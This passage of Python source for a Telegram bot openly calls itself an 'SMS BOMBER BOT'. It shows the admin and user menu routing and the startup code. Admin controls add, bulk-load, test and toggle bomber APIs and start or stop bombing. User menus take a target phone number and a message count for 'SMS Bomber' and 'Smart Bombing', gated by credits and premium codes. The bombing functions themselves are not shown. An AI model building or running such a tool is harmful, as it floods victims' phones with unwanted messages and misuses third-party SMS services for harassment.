            "🟢 Add Credit": lambda: admin_add_credit(update, context),
            "🔴 Remove Credit": lambda: admin_remove_credit(update, context),
            "👥 Users List": lambda: admin_users_list(update, context),
            "🏆 Top Users": lambda: admin_top_users(update, context),
            "💰 Total Balance": lambda: admin_total_balance(update, context),
            "📣 Broadcast": lambda: admin_broadcast(update, context),
            "🎟️ Create Code": lambda: admin_create_code(update, context),
            "➕ Add API": lambda: admin_add_api(update, context),
            "✏️ Edit API": lambda: admin_edit_api(update, context),
            "🗑️ Delete API": lambda: admin_delete_api(update, context),
            "🔄 Toggle API": lambda: admin_toggle_api(update, context),
            "📋 View APIs": lambda: admin_view_apis(update, context),
            "🔑 SMS API Manager": lambda: admin_sms_api(update, context),
            "🔑 Set SMS API Key": lambda: admin_set_sms_api_key(update, context),
            "🌐 Set SMS API URL": lambda: admin_set_sms_api_url(update, context),
            "📋 View SMS API": lambda: admin_view_sms_api(update, context),
            "⚡ Simple Add API": lambda: admin_add_simple_api(update, context),
            "📦 Bulk Add APIs": lambda: admin_add_bulk_apis(update, context),
            "📦 Bulk Add Large": lambda: add_bulk_apis_large(update, context),
            "🧪 Test All APIs": lambda: admin_test_all_apis(update, context),
            "🗑️ Delete Inactive": lambda: admin_delete_inactive_apis(update, context),
            "⛔ Stop Bombing": lambda: stop_bombing(update, context),
            "✅ Start Bombing": lambda: start_bombing(update, context),
            "🔄 Restart Bot": lambda: admin_restart_bot(update, context),
            "🎬 Media Manager": lambda: update.message.reply_text("🎬 **Media Manager**\n\nPhoto / Video / GIF welcome media", parse_mode="Markdown", reply_markup=get_media_manager_menu()),
            "💾 Backup Manager": lambda: update.message.reply_text("💾 **Backup Manager**\n\nAuto backup + Import/Export", parse_mode="Markdown", reply_markup=get_backup_manager_menu()),
            "Backup Manager": lambda: update.message.reply_text("💾 **Backup Manager**\n\nAuto backup + Import/Export", parse_mode="Markdown", reply_markup=get_backup_manager_menu()),
            "Backup Now": lambda: admin_backup_now(update, context),
            "💾 Backup Now": lambda: admin_backup_now(update, context),
            "Import DB": lambda: admin_import_prompt(update, context),
            "📥 Import DB": lambda: admin_import_prompt(update, context),
            "Enable AutoBackup": lambda: admin_backup_enable(update, context, True),
            "🟢 Enable AutoBackup": lambda: admin_backup_enable(update, context, True),
            "Disable AutoBackup": lambda: admin_backup_enable(update, context, False),
            "🔴 Disable AutoBackup": lambda: admin_backup_enable(update, context, False),
            "Set Interval": lambda: admin_backup_set_interval(update, context),
            "⏰ Set Interval": lambda: admin_backup_set_interval(update, context),
            "Backup Status": lambda: admin_backup_status(update, context),
            "📋 Backup Status": lambda: admin_backup_status(update, context),
            "Export JSON": lambda: admin_export_json(update, context),
            "📤 Export JSON": lambda: admin_export_json(update, context),
            "Export SQLite": lambda: admin_export_sqlite(update, context),
            "📤 Export SQLite": lambda: admin_export_sqlite(update, context),
            "Media Manager": lambda: update.message.reply_text("🎬 **Media Manager**\n\nPhoto / Video / GIF welcome media", parse_mode="Markdown", reply_markup=get_media_manager_menu()),
            "🎬 Add Media": lambda: (context.user_data.update({"admin_state": "add_welcome_media"}) or update.message.reply_text("📤 Send a Photo / Video / GIF / Animation now.\n\nOptional: add caption in the same message.", parse_mode="Markdown", reply_markup=get_back_keyboard())),
            "📋 List Media": lambda: admin_list_welcome_media(update, context),
            "🟢 Enable Media": lambda: admin_toggle_welcome_media(update, context, True),
            "🔴 Disable Media": lambda: admin_toggle_welcome_media(update, context, False),
            "🎲 Mode: Random": lambda: admin_set_media_mode(update, context),
            "🗑️ Delete Media": lambda: admin_delete_welcome_media_prompt(update, context),
            "🧪 Test Welcome Media": lambda: admin_test_welcome_media(update, context),
            "Add Media": lambda: (context.user_data.update({"admin_state": "add_welcome_media"}) or update.message.reply_text("📤 Send a Photo / Video / GIF / Animation now.\n\nOptional: add caption in the same message.", parse_mode="Markdown", reply_markup=get_back_keyboard())),
            "List Media": lambda: admin_list_welcome_media(update, context),
            "Enable Media": lambda: admin_toggle_welcome_media(update, context, True),
            "Disable Media": lambda: admin_toggle_welcome_media(update, context, False),
            "Mode: Random": lambda: admin_set_media_mode(update, context),
            "Delete Media": lambda: admin_delete_welcome_media_prompt(update, context),
            "Test Welcome Media": lambda: admin_test_welcome_media(update, context),
            "🔙 Back to Admin": lambda: update.message.reply_text("🛡️ **Admin Panel**", parse_mode="Markdown", reply_markup=get_admin_main_menu()),
            "🔙 Back to Settings": lambda: update.message.reply_text("🔧 **Settings Menu**", parse_mode="Markdown", reply_markup=get_settings_menu()),
            "🔙 Exit Admin": lambda: update.message.reply_text("👤 **Switching to user mode...**", parse_mode="Markdown", reply_markup=get_main_keyboard()),
            "📝 Welcome Message": lambda: update.message.reply_text("📝 **Welcome Message**\n\nEnter new welcome message:", parse_mode="Markdown", reply_markup=get_back_keyboard()) or context.user_data.update({'admin_state': 'set_welcome'}),
            "👥 Required Group": lambda: update.message.reply_text("👥 **Required Group**\n\nEnter group ID (e.g., -1001234567890)\nType 'no' to disable:", parse_mode="Markdown", reply_markup=get_back_keyboard()) or context.user_data.update({'admin_state': 'set_group'}),
        }
        
        handler = admin_menu_handlers.get(clean_message)
        if handler:
            await handler()
            if clean_message in ["🔙 Back to Admin", "🔙 Back to Settings", "🔙 Exit Admin"]:
                context.user_data.clear()
            return
        
        admin_state = context.user_data.get('admin_state')
        if admin_state:
            if admin_state == 'test_api_number':
                await test_api_number_handler(update, context)
                return
            elif admin_state == 'test_api_message':
                await test_api_message_handler(update, context)
                return
            elif admin_state in ['add_api', 'edit_api_id', 'edit_api_data', 'delete_api', 'toggle_api']:
                await api_manager_state_handler(update, context)
                return
            elif admin_state == 'delete_inactive':
                await process_delete_inactive(update, context)
                return
            elif admin_state == 'add_simple_api':
                await process_simple_api(update, context)
                return
            elif admin_state == 'add_bulk_apis':
                await process_bulk_apis(update, context)
                return
            elif admin_state == 'add_bulk_apis_large':
                await process_bulk_apis_large(update, context)
                return
            elif admin_state == 'add_welcome_media':
                # text-only reminder; actual media handled by media handler
                await update.message.reply_text("📤 Please send a Photo / Video / GIF / Animation (not only text).", reply_markup=get_back_keyboard())
                return
            elif admin_state == 'delete_welcome_media':
                await process_delete_welcome_media(update, context)
                return
            elif admin_state == 'set_backup_interval':
                await process_set_backup_interval(update, context)
                return
            elif admin_state == 'firebase_add_urls':
                await process_firebase_add_urls(update, context)
                return
            elif admin_state == 'firebase_add_txt':
                await process_firebase_add_txt(update, context)
                return
            elif admin_state == 'import_db_file':
                await update.message.reply_text("📥 Please send a .json file (document), not text.", reply_markup=get_back_keyboard())
                return
            else:
                await admin_state_handler(update, context)
                return
    
    # User menu handlers
    user_menu_handlers = {
        "📨 Send SMS": lambda: cmd_sms(update, context),
        "💣 SMS Bomber": lambda: cmd_bomber(update, context),
        "📤 Bulk SMS": lambda: cmd_bulk_sms(update, context),
        "👤 My Profile": lambda: profile(update, context),
        "🎁 Redeem Code": lambda: redeem(update, context),
        "📞 Support": lambda: contact(update, context),
        "⭐ Daily Bonus": lambda: daily_bonus(update, context),
        "🏆 Leaderboard": lambda: leaderboard(update, context),
        "👑 Premium": lambda: premium_features(update, context),
        "🎯 Smart Bombing": lambda: smart_bombing(update, context),
    }
    
    if clean_message in user_menu_handlers:
        await user_menu_handlers[clean_message]()
        return
    
    # Utilities handlers
    utilities_handlers = {
        "🌐 IP Info": lambda: handle_utilities(update, context),
        "💰 Bitcoin Price": lambda: handle_utilities(update, context),
        "🥇 Gold Price": lambda: handle_utilities(update, context),
        "🦠 COVID-19": lambda: handle_utilities(update, context),
        "💱 Currency Converter": lambda: handle_utilities(update, context),
        "📡 Service Status": lambda: handle_utilities(update, context),
        "🌤️ Weather": lambda: handle_utilities(update, context),
        "🎬 Movie Info": lambda: handle_utilities(update, context),
        "📮 ZIP Code": lambda: handle_utilities(update, context),
        "🏛️ Universities": lambda: handle_utilities(update, context),
        "📰 News": lambda: handle_utilities(update, context),
    }
    
    if clean_message in utilities_handlers:
        await utilities_handlers[clean_message]()
        return
    
    # Fun handlers
    fun_handlers = {
        "😂 Random Joke": lambda: handle_fun(update, context),
        "🐕 Random Dog": lambda: handle_fun(update, context),
        "🎯 Random Activity": lambda: handle_fun(update, context),
        "👤 Random User": lambda: handle_fun(update, context),
        "💬 Random Quote": lambda: handle_fun(update, context),
        "🎂 Age Predictor": lambda: handle_fun(update, context),
        "🧑‍🤝‍🧑 Gender Predictor": lambda: handle_fun(update, context),
        "🌍 Nationality Predictor": lambda: handle_fun(update, context),
    }
    
    if clean_message in fun_handlers:
        await fun_handlers[clean_message]()
        return
    
    # Sports handlers
    sports_handlers = {
        "⚽ Football Predictions": lambda: handle_sports(update, context),
        "🏏 Cricket": lambda: handle_sports(update, context),
        "🏀 Basketball": lambda: handle_sports(update, context),
        "🎾 Tennis": lambda: handle_sports(update, context),
    }
    
    if clean_message in sports_handlers:
        await sports_handlers[clean_message]()
        return
    
    # Finance handlers
    finance_handlers = {
        "💰 Bitcoin Price": lambda: handle_finance(update, context),
        "🥇 Gold Price": lambda: handle_finance(update, context),
        "💱 Currency Converter": lambda: handle_finance(update, context),
        "📈 Stock Market": lambda: handle_finance(update, context),
        "🏦 Bank Rates": lambda: handle_finance(update, context),
        "💳 Crypto Prices": lambda: handle_finance(update, context),
    }
    
    if clean_message in finance_handlers:
        await finance_handlers[clean_message]()
        return
    
    # User states
    state = context.user_data.get('state')
    if state:
        if state in ['currency_convert', 'service_status', 'weather', 'movie_info', 'zip_info', 'universities', 'age_predict', 'gender_predict', 'nationality_predict']:
            await handle_utility_state(update, context)
            return
    
    # SMS states
    sms_states = ['sms_number', 'sms_message', 'bomber_number', 'bomber_amount', 'redeem_code', 'bulk_numbers', 'bulk_message', 'smart_bombing_number', 'smart_bombing_amount']
    if state in sms_states:
        state_handlers = {
            'sms_number': sms_number,
            'sms_message': sms_message,
            'bomber_number': bomber_number,
            'bomber_amount': bomber_amount,
            'redeem_code': redeem_process,
            'bulk_numbers': bulk_numbers,
            'bulk_message': bulk_message,
            'smart_bombing_number': smart_bombing_number,
            'smart_bombing_amount': smart_bombing_amount,
        }
        await state_handlers[state](update, context)
        return
    
    await update.message.reply_text("❌ **Please use the buttons below:**", parse_mode="Markdown", 
                                     reply_markup=get_main_keyboard() if user_id != ADMIN_ID else get_admin_main_menu())

# ===================== MAIN =====================
async def main():
    global RESTART_COUNT
    
    try:
        print("="*50)
        print("🔥 SMS BOMBER BOT STARTING...")
        print("="*50)
        
        await init_db()
        
        application = Application.builder().token(BOT_TOKEN).build()

        # ===== FORCE ALL BOT REPLIES INTO QUOTE FORMAT =====
        from telegram import Message as _TGMessage
        _orig_reply = _TGMessage.reply_text
        _orig_edit = _TGMessage.edit_text

        async def _quoted_reply(self, text, *args, **kwargs):
            if text and not (isinstance(text, str) and text.strip().startswith("<blockquote>")):
                text = f"<blockquote>{text}</blockquote>"
            kwargs["parse_mode"] = "HTML"
            return await _orig_reply(self, text, *args, **kwargs)

        async def _quoted_edit(self, text, *args, **kwargs):
            if text and not (isinstance(text, str) and text.strip().startswith("<blockquote>")):
                text = f"<blockquote>{text}</blockquote>"
            kwargs["parse_mode"] = "HTML"
            return await _orig_edit(self, text, *args, **kwargs)

        _TGMessage.reply_text = _quoted_reply
        _TGMessage.edit_text = _quoted_edit

        from telegram import CallbackQuery as _TGCallback
        _orig_cq_edit = _TGCallback.edit_message_text

        async def _quoted_cq_edit(self, text, *args, **kwargs):
            if text and not (isinstance(text, str) and text.strip().startswith("<blockquote>")):
                text = f"<blockquote>{text}</blockquote>"
            kwargs["parse_mode"] = "HTML"
            return await _orig_cq_edit(self, text, *args, **kwargs)

        _TGCallback.edit_message_text = _quoted_cq_edit
        # =====================================================
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("daily", daily_bonus))
        application.add_handler(CommandHandler("buy_premium", buy_premium))
        application.add_handler(CommandHandler("restart", admin_restart_bot))
        application.add_handler(CallbackQueryHandler(check_group_callback, pattern="check_group"))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        # Media upload handler (welcome media manager)
        async def media_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
            if update.effective_user.id != ADMIN_ID:
                return
            state = context.user_data.get("admin_state")
            if state == "add_welcome_media":
                await process_add_welcome_media(update, context)
            elif state == "import_db_file" and update.message.document:
                await process_import_db_file(update, context)
            elif state == "firebase_add_txt":
                await process_firebase_add_txt(update, context)

        application.add_handler(MessageHandler(
            (filters.PHOTO | filters.VIDEO | filters.ANIMATION | filters.Document.ALL) & ~filters.COMMAND,
            media_upload_handler
        ))
        
        await application.initialize()
        await application.start()
        await application.updater.start_polling()
        
        # Start auto-backup scheduler if enabled
        try:
            await start_backup_scheduler(application)
            print(f"💾 Backup scheduler: {'ON' if get_setting('backup_enabled','false')=='true' else 'OFF'}")
        except Exception as be:
            print(f"Backup scheduler start error: {be}")

        print("✅ Bot is RUNNING!")
        print(f"📡 Bomber APIs: {len(BOMBER_APIS)}")
        print(f"📨 Send APIs: {len(SEND_APIS)}")
        print(f"🔑 SMS API: {'✅ Configured' if SMS_API_URL and SMS_API_KEY else '❌ Not Configured'}")
        print(f"💣 Bombing: {'🟢 Active' if BOMBING_ACTIVE else '🔴 Inactive'}")
        print(f"👥 Required Group: {get_setting('required_group', 'None')}")
        print("="*50)
        
        def signal_handler(sig, frame):
            print("\n⛔ Shutting down...")
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        RESTART_COUNT += 1
        print(f"❌ Error: {e}")
        logger.error(f"Main error: {e}")
        
        if RESTART_COUNT > MAX_RESTARTS:
            print(f"❌ Too many restarts ({RESTART_COUNT}). Stopping.")
            sys.exit(1)
        
        await asyncio.sleep(5)
        print(f"🔄 Auto-restarting... (Attempt {RESTART_COUNT}/{MAX_RESTARTS})")
        await main()
    finally:
        await close_db()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ Bot stopped!")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        import time
        time.sleep(5)
        print("🔄 Auto-restarting after crash...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
